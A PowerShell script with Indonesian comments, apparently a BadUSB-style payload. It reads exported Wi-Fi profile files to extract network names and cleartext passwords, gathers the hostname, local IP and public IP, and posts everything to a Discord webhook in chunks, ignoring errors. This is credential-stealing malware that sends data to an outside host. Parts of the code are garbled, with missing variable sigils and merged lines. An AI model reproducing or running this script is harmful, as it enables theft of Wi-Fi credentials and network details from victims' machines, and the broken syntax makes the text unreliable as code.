# Mengambil data profil Wi-Fi
d = Get-ChildItem (Join-Path env:temp 'Wi*.xml') | ForEach-Object { 
    [xml]x = Get-Content _.FullName
    [PSCustomObject]@{ 
        SSID = \$x.WLANProfile.name
        Pass = \$x.WLANProfile.MSM.Security.sharedKey.keyMaterial 
    } 
}

# Mengambil informasi Hostname dan IP
\(hostname = [System.Net.Dns]::GetHostName()\)localIP  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { \(_.InterfaceAlias -notlike '*Loopback*' }).IPAddress -join ', '\)publicIP = (Invoke-WebRequest -Uri "https://ipify.org" -UseBasicParsing).Content

# Menyusun teks informasi sistem dasar
\$systemInfo = @"
**System Info:**
Hostname: \$hostname
Local IP: \$localIP
Public IP: \$publicIP

**Wi-Fi Profiles:**
"@

# Fungsi untuk mengirim payload ke Discord secara aman
function Send-DiscordWebhook (\$text) {
    \(payload = @{ content =\)text } | ConvertTo-Json -Depth 2
    try {
        Invoke-WebRequest -Uri 'https://discord.com' -Method Post -Body \$payload -ContentType 'application/json' -UseBasicParsing | Out-Null
    } catch {
        # Mengabaikan error jika ada kendala jaringan saat pengiriman chunk
    }
}

# Eksekusi jika ada data Wi-Fi ditemukan
if (\$d) {
    # 1. Kirim informasi Sistem Terlebih Dahulu
    Send-DiscordWebhook \$systemInfo
    Start-Sleep -Milliseconds 600

    # 2. Kirim data Wi-Fi secara bertahap (per 5 baris) agar tidak jebol 2000 karakter
    wifiLines = (d | Out-String) -split "`r`n"
    \$currentChunk = ""

    foreach (line in wifiLines) {
        # Batasi chunk per pengiriman maksimal 1500 karakter saja untuk cari aman
        if ((currentChunk.Length + line.Length + 2) -gt 1500) {
            if (\$currentChunk.Trim() -ne "") {
                Send-DiscordWebhook \$currentChunk
                Start-Sleep -Milliseconds 600 # Jeda anti rate-limit Discord
            }
            currentChunk = line
        } else {
            if (\$currentChunk -eq "") { currentChunk = line }
            else { \$currentChunk += "`r`n" + \$line }
        }
    }

    # Kirim sisa potongan baris terakhir jika ada
    if (\$currentChunk.Trim() -ne "") {
        Send-DiscordWebhook \$currentChunk
    }
}
